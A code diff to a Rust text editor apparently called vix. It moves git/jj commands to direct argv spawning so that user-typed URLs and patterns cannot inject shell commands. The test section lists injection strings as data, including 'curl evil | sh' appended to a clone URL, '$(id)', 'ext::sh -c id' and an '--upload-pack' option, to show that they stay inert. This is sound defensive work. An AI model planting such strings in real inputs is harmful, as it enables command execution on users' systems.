@@ -2969,31 +2969,14 @@ impl App {
     }
 
     #[cfg(any(feature = "git", feature = "jj"))]
-    /// Single-quote `s` for safe use as one `sh -c` word (POSIX escaping).
-    fn shell_single_quote(s: &str) -> String {
-        format!("'{}'", s.replace('\'', "'\\''"))
-    }
-
-    #[cfg(any(feature = "git", feature = "jj"))]
-    /// Quote one user-typed argument (a clone URL, a grep pattern) for the
-    /// shell that [`App::run_command_in`] hands the line to, or `None` when
-    /// it can't be made safe (T569). `allow_dash` is `false` for positional
-    /// arguments, where a leading `-` would be read as an option
-    /// (`--upload-pack=…`). POSIX gets single quotes; `cmd.exe` has no
-    /// reliable quoting, so a metacharacter there is refused outright.
-    fn vcs_shell_arg(s: &str, allow_dash: bool) -> Option<String> {
-        if s.is_empty() || s.chars().any(char::is_control) || (!allow_dash && s.starts_with('-')) {
-            return None;
-        }
-        if cfg!(windows) {
-            if s.chars()
-                .any(|c| "&|<>^\"%!()\r\n".contains(c) || c.is_whitespace())
-            {
-                return None;
-            }
-            return Some(s.to_string());
-        }
-        Some(Self::shell_single_quote(s))
+    /// Whether `s` may be passed to `git`/`jj` as one user-typed argument
+    /// (T569). It reaches the program as a single argv element, so shell
+    /// metacharacters are inert; what remains is refusing empty or control
+    /// input and, when `allow_dash` is `false` (a positional argument such as a
+    /// clone URL), a leading `-` that the program would read as an option
+    /// (`--upload-pack=…`).
+    fn vcs_arg_ok(s: &str, allow_dash: bool) -> bool {
+        !s.is_empty() && !s.chars().any(char::is_control) && (allow_dash || !s.starts_with('-'))
     }
 
     /// Dispatch a buffer-editing action (`edit.undo`/`redo`/`cut`/`copy`/
@@ -12616,7 +12599,51 @@ impl App {
         // Explicitly closed rather than inherited: a background command has
         // no business reading from vix's own stdin (the terminal device vix
         // itself is reading raw input from) (T547).
-        let mut child = match spawn_shell(&script, dir, true) {
+        let spawned = spawn_shell(&script, dir, true).map(|mut child| {
+            let stdout = child.stdout.take().expect("piped stdout");
+            (child, stdout)
+        });
+        self.attach_command(cmd, spawned);
+    }
+
+    /// Run `program` with `args` in the workspace root, **without a shell**
+    /// (T569): each argument reaches the program as exactly one argv element, so
+    /// no quoting is needed and no metacharacter in a user-typed URL, revision
+    /// or message is interpreted. Output streams to the bottom dock the same way
+    /// as [`App::run_command_in`], with stderr merged into the same pipe.
+    #[cfg(any(feature = "git", feature = "jj"))]
+    fn run_argv(&mut self, program: &str, args: &[&str]) {
+        let root = self.root.clone();
+        self.run_argv_in(&root, program, args);
+    }
+
+    /// [`App::run_argv`] in `dir`.
+    #[cfg(any(feature = "git", feature = "jj"))]
+    fn run_argv_in(&mut self, dir: &Path, program: &str, args: &[&str]) {
+        if self.running_command.is_some() {
+            self.status = t!("status.command_busy").to_string();
+            return;
+        }
+        let label = std::iter::once(program)
+            .chain(args.iter().copied())
+            .collect::<Vec<_>>()
+            .join(" ");
+        self.visible.set(Visible::BOTTOM_DOCK, true);
+        self.settings.panels.show_bottom_dock = true;
+        self.bottom_dock.push(format!("$ {label}"));
+        let spawned = spawn_argv(program, args, dir);
+        self.attach_command(&label, spawned);
+    }
+
+    /// Start streaming a spawned command's merged output into the bottom dock:
+    /// report a spawn failure, or hand `reader` to a thread that sends each line
+    /// and then the exit code, and record the [`RunningCommand`].
+    fn attach_command<R: std::io::Read + Send + 'static>(
+        &mut self,
+        label: &str,
+        spawned: std::io::Result<(std::process::Child, R)>,
+    ) {
+        let (child, stdout) = match spawned {
             Ok(c) => c,
             Err(e) => {
                 self.bottom_dock.push(format!("[error: {e}]"));
@@ -12625,7 +12652,6 @@ impl App {
                 return;
             }
         };
-        let stdout = child.stdout.take().expect("piped stdout");
         let child = std::sync::Arc::new(std::sync::Mutex::new(child));
         let (tx, rx) = std::sync::mpsc::channel();
         let reader_child = child.clone();
@@ -12660,7 +12686,7 @@ impl App {
         self.running_command = Some(RunningCommand {
             rx,
             child,
-            label: cmd.to_string(),
+            label: label.to_string(),
         });
     }
 
@@ -12989,6 +13015,35 @@ fn spawn_shell(script: &str, dir: &Path, no_tty: bool) -> std::io::Result<std::p
         .stdout(std::process::Stdio::piped())
         .stderr(std::process::Stdio::null())
         .spawn()
+}
+
+/// Start `program` with `args` directly (no shell) in `dir`, its stdout and
+/// stderr both feeding the returned pipe. The program is resolved against
+/// `PATH` only. Used by [`App::run_argv_in`].
+#[cfg(any(feature = "git", feature = "jj"))]
+fn spawn_argv(
+    program: &str,
+    args: &[&str],
+    dir: &Path,
+) -> std::io::Result<(std::process::Child, std::io::PipeReader)> {
+    let (reader, writer) = std::io::pipe()?;
+    let resolved = crate::fileops::which_on_path(program).map_or_else(
+        || std::ffi::OsString::from(program),
+        std::path::PathBuf::into_os_string,
+    );
+    let mut command = std::process::Command::new(resolved);
+    command.args(args);
+    no_tty_prompts(&mut command);
+    command
+        .current_dir(dir)
+        .stdin(std::process::Stdio::null())
+        .stdout(writer.try_clone()?)
+        .stderr(writer);
+    let child = command.spawn()?;
+    // `command` still owns the write ends; drop it so the reader sees EOF when
+    // the child exits.
+    drop(command);
+    Ok((child, reader))
 }
 
 /// Without `tasks` Vix never starts a shell.
@@ -13450,29 +13505,50 @@ mod tests {
         assert!(!is_auth_failure_line("Everything up-to-date"));
     }
 
-    /// T569: hostile clone URLs / patterns are refused or quoted into one
-    /// shell word, never interpreted.
+    /// T569: `run_argv` hands every argument to the program as one argv element,
+    /// so shell metacharacters in it are printed back verbatim, never run.
+    #[cfg(all(unix, any(feature = "git", feature = "jj")))]
+    #[test]
+    fn run_argv_passes_hostile_text_as_a_single_argument() {
+        let marker = std::env::temp_dir().join(format!("vix-argv-{}", std::process::id()));
+        let hostile = format!("x; touch {} $(id) `id` --upload-pack=y", marker.display());
+        let mut app = App::new(std::env::temp_dir(), Settings::default());
+        app.run_argv("printf", &["%s\\n", &hostile]);
+        for _ in 0..200 {
+            app.poll_command();
+            if app.running_command.is_none() {
+                break;
+            }
+            std::thread::sleep(std::time::Duration::from_millis(25));
+        }
+        assert!(app.running_command.is_none(), "the command finished");
+        assert!(
+            app.bottom_dock.lines.contains(&hostile),
+            "the argument came back as one literal line: {:?}",
+            app.bottom_dock.lines
+        );
+        assert!(!marker.exists(), "no shell ran the embedded command");
+    }
+
+    /// T569: option-shaped, empty and control-character arguments are refused;
+    /// shell metacharacters are fine because no shell sees them.
     #[cfg(any(feature = "git", feature = "jj"))]
     #[test]
-    fn vcs_shell_arg_refuses_options_and_quotes_metacharacters() {
-        assert_eq!(App::vcs_shell_arg("--upload-pack=touch x", false), None);
-        assert_eq!(App::vcs_shell_arg("-x", false), None);
-        assert_eq!(App::vcs_shell_arg("", false), None);
-        assert_eq!(App::vcs_shell_arg("a\nb", false), None);
+    fn vcs_arg_ok_refuses_options_and_control_characters() {
+        assert!(!App::vcs_arg_ok("--upload-pack=touch x", false));
+        assert!(!App::vcs_arg_ok("-x", false));
+        assert!(!App::vcs_arg_ok("", false));
+        assert!(!App::vcs_arg_ok("a\nb", false));
         // A pattern may legitimately start with `-` (the caller uses `-e`).
-        assert!(App::vcs_shell_arg("-foo", true).is_some());
-        if !cfg!(windows) {
-            for hostile in [
-                "https://x/r.git; curl evil | sh",
-                "$(id)",
-                "`id`",
-                "ext::sh -c id",
-                "it's",
-            ] {
-                let q = App::vcs_shell_arg(hostile, false).unwrap();
-                assert!(q.starts_with('\'') && q.ends_with('\''), "{q}");
-            }
-            assert_eq!(App::vcs_shell_arg("it's", false).unwrap(), "'it'\\''s'");
+        assert!(App::vcs_arg_ok("-foo", true));
+        for hostile in [
+            "https://x/r.git; curl evil | sh",
+            "$(id)",
+            "`id`",
+            "ext::sh -c id",
+            "it's",
+        ] {
+            assert!(App::vcs_arg_ok(hostile, false), "{hostile}");
         }
     }
 
